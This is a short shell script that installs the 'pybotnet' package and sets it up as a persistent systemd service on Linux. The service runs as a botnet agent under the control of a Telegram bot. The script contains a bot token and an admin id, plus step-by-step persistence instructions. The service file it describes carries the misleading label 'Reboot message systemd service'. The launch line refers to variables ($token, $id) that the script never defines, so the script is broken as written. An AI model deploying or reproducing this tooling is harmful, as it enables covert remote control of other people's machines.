#!/bin/sh

## add pybotnet to linux systemd service ##

# (step 0) replace youre telegram_bt_token, admin_id and botnet_id with your own:
telegram_bt_token=50882347232:AAFdKuWopE9Mg-5Mj1WURfuu90cBGYaSAC
admin_id=7903674345
bot_name=linux_service_bot_1

# (step 1)
# run `sudo chmod +x ./botnet.sh` to make it executable

# (step 2)
#```in file /etc/systemd/system/botnet.service:
# [Unit]
# Description=Reboot message systemd service.
# [Service]
# Type=simple
# ExecStart=/bin/sh [PATH-TO-FILE]/botnet.sh
# [Install]
# WantedBy=multi-user.target
#```
# replace [PATH-TO-FILE] with your path to this file

# (step 3)
# run:
# `sudo chmod 644 /etc/systemd/system/botnet.service`
# `sudo systemctl daemon-reload`
# `sudo systemctl enable botnet.service`
# `sudo systemctl start botnet.service`

echo "$(date) install dependencies" >> /tmp/pybotnet.log
apt update
apt install python3-pip
apt install python3-dev
pip3 install pybotnet -U --pre

echo "$(date) start pybotnet" >> /tmp/pybotnet.log
python3 -m pybotnet $token $id $bot_name
